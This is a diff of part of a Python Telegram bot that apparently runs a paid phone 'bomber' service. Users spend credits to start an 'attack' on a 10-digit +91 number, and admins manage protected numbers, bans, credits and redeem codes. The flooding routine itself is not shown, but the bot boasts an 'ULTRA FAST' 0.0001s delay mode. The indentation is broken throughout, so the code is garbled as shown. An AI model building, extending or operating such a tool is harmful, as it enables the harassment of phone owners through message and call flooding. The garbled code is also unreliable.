 async def show_allowed_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
-conn = sqlite3.connect('bomber_users.db')
+    conn = sqlite3.connect('bomber_users.db')
 cursor = conn.cursor()
 cursor.execute('SELECT user_id, allowed_by, timestamp FROM allowed_users ORDER BY timestamp DESC')
 allowed = cursor.fetchall()
 conn.close()
 
 if not allowed:
-await update.message.reply_text("🔒 No allowed users!", parse_mode='Markdown')
+    await update.message.reply_text("🔒 No allowed users!", parse_mode='Markdown')
 return
 
 msg = "✅ *Allowed Users*\n━━━━━━━━━━━━━━━━━━━━━\n\n"
 for uid, by_admin, time in allowed[:30]:
-msg += f"🆔 {uid}\n👤 By: {by_admin}\n⏰ {time}\n\n"
+    msg += f"🆔 {uid}\n👤 By: {by_admin}\n⏰ {time}\n\n"
 
 if len(allowed) > 30:
-msg += f"\n... and {len(allowed) - 30} more"
+    msg += f"\n... and {len(allowed) - 30} more"
 
 await update.message.reply_text(msg, parse_mode='Markdown')
 
 async def show_redeem_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
-conn = sqlite3.connect('bomber_users.db')
+    conn = sqlite3.connect('bomber_users.db')
 cursor = conn.cursor()
 cursor.execute('SELECT code, amount, days, created_by, created_at, used_by, used_at FROM redeem_codes ORDER BY created_at DESC')
 codes = cursor.fetchall()
 conn.close()
 
 if not codes:
-await update.message.reply_text("📜 No redeem codes!", parse_mode='Markdown')
+    await update.message.reply_text("📜 No redeem codes!", parse_mode='Markdown')
 return
 
 msg = "🎟️ *Redeem Codes*\n━━━━━━━━━━━━━━━━━━━━━\n\n"
 for code, amount, days, by_admin, created, used_by, used_at in codes[:20]:
-status = f"✅ Used by {used_by}" if used_by else "⏳ Available"
+    status = f"✅ Used by {used_by}" if used_by else "⏳ Available"
 msg += f"🎫 `{code}`\n💰 {amount} credits\n⏱️ {days} days\n{status}\n\n"
 
 if len(codes) > 20:
-msg += f"\n... and {len(codes) - 20} more"
+    msg += f"\n... and {len(codes) - 20} more"
 
 await update.message.reply_text(msg, parse_mode='Markdown')
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-user_id = update.effective_user.id
+    user_id = update.effective_user.id
 text = update.message.text
 
 print(f"[DEBUG] Message received from user {user_id}")
@@ -1609,61 +1609,61 @@ print(f"[DEBUG] awaiting_phone status: {context.user_data.get('awaiting_phone', 
 
 # Handle button presses
 if text == "💣 Start Attack":
-await bomb_command(update, context)
+    await bomb_command(update, context)
 return
 elif text == "🛑 Stop Attack":
-await stop_command(update, context)
+    await stop_command(update, context)
 return
 elif text == "📊 My Stats" or text == "📊 Credits":
-await stats_command(update, context)
+    await stats_command(update, context)
 return
 elif text == "💰 My Credits":
-await credits_command(update, context)
+    await credits_command(update, context)
 return
 elif text == "🎫 Redeem Code":
-await redeem_command(update, context)
+    await redeem_command(update, context)
 return
 elif text == "📋 My History":
-await myattacks_command(update, context)
+    await myattacks_command(update, context)
 return
 elif text == "❓ Help":
-await help_command(update, context)
+    await help_command(update, context)
 return
 elif text == "ℹ️ About":
-await about_command(update, context)
+    await about_command(update, context)
 return
 elif text == "⬅️ Back":
-await start_command(update, context)
+    await start_command(update, context)
 return
 
 # Admin-only buttons
 if user_id in ADMIN_IDS:
-if text == "➕ Protect Number":
-await update.message.reply_text("📲 Send the phone number to protect (10 digits):")
+    if text == "➕ Protect Number":
+        await update.message.reply_text("📲 Send the phone number to protect (10 digits):")
 context.user_data['admin_action'] = 'protect_number'
 return
 elif text == "➖ Unprotect Number":
-await update.message.reply_text("📲 Send the phone number to unprotect (10 digits):")
+    await update.message.reply_text("📲 Send the phone number to unprotect (10 digits):")
 context.user_data['admin_action'] = 'unprotect_number'
 return
 elif text == "🚷 Ban User":
-await update.message.reply_text("🛑 Send the Telegram user ID to ban:")
+    await update.message.reply_text("🛑 Send the Telegram user ID to ban:")
 context.user_data['admin_action'] = 'ban_user'
 return
 elif text == "🚳 Unban User":
-await update.message.reply_text("✅ Send the Telegram user ID to unban:")
+    await update.message.reply_text("✅ Send the Telegram user ID to unban:")
 context.user_data['admin_action'] = 'unban_user'
 return
 elif text == "➕ Allow User":
-await update.message.reply_text("➕ Send the Telegram user ID to allow:")
+    await update.message.reply_text("➕ Send the Telegram user ID to allow:")
 context.user_data['admin_action'] = 'allow_user'
 return
 elif text == "➖ Disallow User":
-await update.message.reply_text("➖ Send the Telegram user ID to disallow:")
+    await update.message.reply_text("➖ Send the Telegram user ID to disallow:")
 context.user_data['admin_action'] = 'disallow_user'
 return
 elif text == "➕ Give Credit":
-await update.message.reply_text(
+    await update.message.reply_text(
 "➕ Give Credits\n\n"
 "Format: <user_id> <amount> <days>\n"
 "Example: 123456789 10 30\n\n"
@@ -1673,7 +1673,7 @@ await update.message.reply_text(
 context.user_data['admin_action'] = 'give_credit'
 return
 elif text == "🔁 Gen Redeem Code":
-await update.message.reply_text(
+    await update.message.reply_text(
 "🔁 Generate Redeem Code\n\n"
 "Format: <amount> <days>\n"
 "Example: 5 7\n\n"
@@ -1685,126 +1685,126 @@ await update.message.reply_text(
 context.user_data['admin_action'] = 'gen_redeem'
 return
 elif text == "📜 Protected List":
-await show_protected_list(update, context)
+    await show_protected_list(update, context)
 return
 elif text == "📵 Banned List":
-await show_banned_list(update, context)
+    await show_banned_list(update, context)
 return
 elif text == "🔒 Allowed List":
-await show_allowed_list(update, context)
+    await show_allowed_list(update, context)
 return
 elif text == "👥 Users":
-await get_all_users(update, context)
+    await get_all_users(update, context)
 return
 elif text == "📜 Redeem Codes":
-await show_redeem_codes(update, context)
+    await show_redeem_codes(update, context)
 return
 elif text == "📣 Broadcast":
-await update.message.reply_text("📣 Send the message to broadcast to all users:")
+    await update.message.reply_text("📣 Send the message to broadcast to all users:")
 context.user_data['admin_action'] = 'broadcast'
 return
 
 # Process admin actions
 admin_action = context.user_data.get('admin_action')
 if admin_action and user_id in ADMIN_IDS:
-conn = sqlite3.connect('bomber_users.db')
+    conn = sqlite3.connect('bomber_users.db')
 cursor = conn.cursor()
 
 if admin_action == 'protect_number':
-phone = text.strip()
+    phone = text.strip()
 if not phone.isdigit() or len(phone) != 10:
-await update.message.reply_text("❌ Invalid phone number! Please send 10 digits.")
+    await update.message.reply_text("❌ Invalid phone number! Please send 10 digits.")
 else:
-cursor.execute('INSERT OR REPLACE INTO protected_numbers VALUES (?, ?, ?)',
+    cursor.execute('INSERT OR REPLACE INTO protected_numbers VALUES (?, ?, ?)',
 (phone, user_id, datetime.now().isoformat()))
 conn.commit()
 await update.message.reply_text(f"✅ Protected +91{phone}!")
 context.user_data['admin_action'] = None
 
 elif admin_action == 'unprotect_number':
-phone = text.strip()
+    phone = text.strip()
 if not phone.isdigit() or len(phone) != 10:
-await update.message.reply_text("❌ Invalid phone number! Please send 10 digits.")
+    await update.message.reply_text("❌ Invalid phone number! Please send 10 digits.")
 else:
-cursor.execute('DELETE FROM protected_numbers WHERE phone = ?', (phone,))
+    cursor.execute('DELETE FROM protected_numbers WHERE phone = ?', (phone,))
 conn.commit()
 if cursor.rowcount > 0:
-await update.message.reply_text(f"✅ Unprotected +91{phone}!")
+    await update.message.reply_text(f"✅ Unprotected +91{phone}!")
 else:
-await update.message.reply_text(f"⚠️ +91{phone} was not in protected list!")
+    await update.message.reply_text(f"⚠️ +91{phone} was not in protected list!")
 context.user_data['admin_action'] = None
 
 elif admin_action == 'ban_user':
-try:
-target_id = int(text.strip())
+    try:
+        target_id = int(text.strip())
 cursor.execute('INSERT OR REPLACE INTO banned_users VALUES (?, ?, ?, ?)',
 (target_id, user_id, datetime.now().isoformat(), 'Banned by admin'))
 conn.commit()
 await update.message.reply_text(f"🚫 Banned user {target_id}!")
 except ValueError:
-await update.message.reply_text("❌ Invalid user ID! Please send numbers only.")
+    await update.message.reply_text("❌ Invalid user ID! Please send numbers only.")
 context.user_data['admin_action'] = None
 
 elif admin_action == 'unban_user':
-try:
-target_id = int(text.strip())
+    try:
+        target_id = int(text.strip())
 cursor.execute('DELETE FROM banned_users WHERE user_id = ?', (target_id,))
 conn.commit()
 if cursor.rowcount > 0:
-await update.message.reply_text(f"✅ Unbanned user {target_id}!")
+    await update.message.reply_text(f"✅ Unbanned user {target_id}!")
 else:
-await update.message.reply_text(f"⚠️ User {target_id} was not banned!")
+    await update.message.reply_text(f"⚠️ User {target_id} was not banned!")
 except ValueError:
-await update.message.reply_text("❌ Invalid user ID! Please send numbers only.")
+    await update.message.reply_text("❌ Invalid user ID! Please send numbers only.")
 context.user_data['admin_action'] = None
 
 elif admin_action == 'allow_user':
-try:
-target_id = int(text.strip())
+    try:
+        target_id = int(text.strip())
 cursor.execute('INSERT OR REPLACE INTO allowed_users VALUES (?, ?, ?)',
 (target_id, user_id, datetime.now().isoformat()))
 conn.commit()
 await update.message.reply_text(f"✅ Allowed user {target_id}!")
 except ValueError:
-await update.message.reply_text("❌ Invalid user ID! Please send numbers only.")
+    await update.message.reply_text("❌ Invalid user ID! Please send numbers only.")
 context.user_data['admin_action'] = None
 
 elif admin_action == 'disallow_user':
-try:
-target_id = int(text.strip())
+    try:
+        target_id = int(text.strip())
 cursor.execute('DELETE FROM allowed_users WHERE user_id = ?', (target_id,))
 conn.commit()
 if cursor.rowcount > 0:
-await update.message.reply_text(f"✅ Disallowed user {target_id}!")
+    await update.message.reply_text(f"✅ Disallowed user {target_id}!")
 else:
-await update.message.reply_text(f"⚠️ User {target_id} was not in allowed list!")
+    await update.message.reply_text(f"⚠️ User {target_id} was not in allowed list!")
 except ValueError:
-await update.message.reply_text("❌ Invalid user ID! Please send numbers only.")
+    await update.message.reply_text("❌ Invalid user ID! Please send numbers only.")
 context.user_data['admin_action'] = None
 
 elif admin_action == 'give_credit':
-try:
-parts = text.strip().split()
+    try:
+        parts = text.strip().split()
 if len(parts) != 3:
-await update.message.reply_text("❌ Invalid format! Use: <user_id> <amount> <days>")
+    await update.message.reply_text("❌ Invalid format! Use: <user_id> <amount> <days>")
 else:
-target_id, amount, days = int(parts[0]), int(parts[1]), int(parts[2])
+    target_id, amount, days = int(parts[0]), int(parts[1]), int(parts[2])
 expiry = None if days == 0 else (datetime.now() + timedelta(days=days)).isoformat()
 cursor.execute('INSERT OR REPLACE INTO credits VALUES (?, ?, ?, ?, ?)',
 (target_id, amount, expiry, user_id, datetime.now().isoformat()))
 conn.commit()
 await update.message.reply_text(f"✅ Gave {amount} credits to user {target_id}!")
 except (ValueError, IndexError):
-await update.message.reply_text("❌ Invalid format! Use: <user_id> <amount> <days>")
+    await update.message.reply_text("❌ Invalid format! Use: <user_id> <amount> <days>")
 context.user_data['admin_action'] = None
 
 elif admin_action == 'gen_redeem':
-try:
-parts = text.strip().split()
+    try:
+        parts = text.strip().split()
 if len(parts) != 2:
-await update.message.reply_text("❌ Invalid format! Use: <amount> <days>")
+    await update.message.reply_text("❌ Invalid format! Use: <amount> <days>")
 else:
-amount, days = int(parts[0]), int(parts[1])
+    amount, days = int(parts[0]), int(parts[1])
 code = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=10))
 cursor.execute('INSERT INTO redeem_codes VALUES (?, ?, ?, ?, ?, ?, ?)',
 (code, amount, days, user_id, datetime.now().isoformat(), None, None))
@@ -1818,21 +1818,21 @@ f"Share this code with users!",
 parse_mode='Markdown'
 )
 except (ValueError, IndexError):
-await update.message.reply_text("❌ Invalid format! Use: <amount> <days>")
+    await update.message.reply_text("❌ Invalid format! Use: <amount> <days>")
 context.user_data['admin_action'] = None
 
 elif admin_action == 'broadcast':
-cursor.execute('SELECT user_id FROM users')
+    cursor.execute('SELECT user_id FROM users')
 all_users = cursor.fetchall()
 success_count = 0
 
 for (uid,) in all_users:
-try:
-await context.bot.send_message(chat_id=uid, text=f"📢 *Broadcast:*\n\n{text}", parse_mode='Markdown')
+    try:
+        await context.bot.send_message(chat_id=uid, text=f"📢 *Broadcast:*\n\n{text}", parse_mode='Markdown')
 success_count += 1
 await asyncio.sleep(0.05)
 except Exception:
-continue
+    continue
 
 await update.message.reply_text(f"✅ Broadcast sent to {success_count}/{len(all_users)} users!")
 context.user_data['admin_action'] = None
@@ -1841,13 +1841,13 @@ conn.close()
 return
 
 if context.user_data.get('awaiting_phone'):
-phone = update.message.text.strip()
+    phone = update.message.text.strip()
 
 print(f"[DEBUG] Phone number entered: {phone}")
 print(f"[DEBUG] Is digit: {phone.isdigit()}, Length: {len(phone)}")
 
 if not phone.isdigit() or len(phone) != 10:
-await update.message.reply_text(
+    await update.message.reply_text(
 "❌ Invalid phone number! Please send a 10-digit number.",
 parse_mode='Markdown'
 )
@@ -1857,7 +1857,7 @@ conn = sqlite3.connect('bomber_users.db')
 cursor = conn.cursor()
 cursor.execute('SELECT 1 FROM protected_numbers WHERE phone = ?', (phone,))
 if cursor.fetchone():
-conn.close()
+    conn.close()
 await update.message.reply_text(
 "🛡️ This number is protected and cannot be attacked!",
 parse_mode='Markdown'
@@ -1867,7 +1867,7 @@ return
 
 cursor.execute('SELECT 1 FROM banned_users WHERE user_id = ?', (user_id,))
 if cursor.fetchone() and user_id not in ADMIN_IDS:
-conn.close()
+    conn.close()
 await update.message.reply_text(
 "🚫 You are banned from using this bot!",
 parse_mode='Markdown'
@@ -1877,9 +1877,9 @@ return
 conn.close()
 
 if user_id not in ADMIN_IDS:
-credits = db_manager.get_user_credits(user_id)
+    credits = db_manager.get_user_credits(user_id)
 if credits < 1:
-await update.message.reply_text(
+    await update.message.reply_text(
 "❌ *Insufficient Credits!*\n\n"
 f"💰 Your Credits: {credits}\n"
 f"💣 Required: 1 credit\n\n"
@@ -1893,8 +1893,8 @@ return
 context.user_data['awaiting_phone'] = False
 
 if user_id not in ADMIN_IDS:
-if not db_manager.deduct_credits(user_id, 1):
-await update.message.reply_text(
+    if not db_manager.deduct_credits(user_id, 1):
+        await update.message.reply_text(
 "❌ *Failed to deduct credits!*\n\n"
 "Your credits may have expired or there was an error.\n"
 "Use /credits to check your balance.",
@@ -1941,24 +1941,24 @@ await update.message.reply_text(status_msg, parse_mode='Markdown')
 return
 
 if context.user_data.get('awaiting_redeem'):
-code = text.strip().upper()
+    code = text.strip().upper()
 context.user_data['awaiting_redeem'] = False
 
 success, message = db_manager.redeem_code(user_id, code)
 
 if success:
-credits = db_manager.get_user_credits(user_id)
+    credits = db_manager.get_user_credits(user_id)
 await update.message.reply_text(
 f"✅ {message}\n\n💰 *Total Credits:* {credits}",
 parse_mode='Markdown'
 )
 else:
-await update.message.reply_text(f"❌ {message}", parse_mode='Markdown')
+    await update.message.reply_text(f"❌ {message}", parse_mode='Markdown')
 return
 
 def main():
-if not TELEGRAM_BOT_TOKEN:
-print("❌ Please set TELEGRAM_BOT_TOKEN environment variable")
+    if not TELEGRAM_BOT_TOKEN:
+        print("❌ Please set TELEGRAM_BOT_TOKEN environment variable")
 return
 
 app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
@@ -1986,4 +1986,4 @@ print("⚡ ULTRA FAST Mode: 0.0001s delays, 0.5s timeouts")
 app.run_polling()
 
 if __name__ == '__main__':
-main()
+    main()
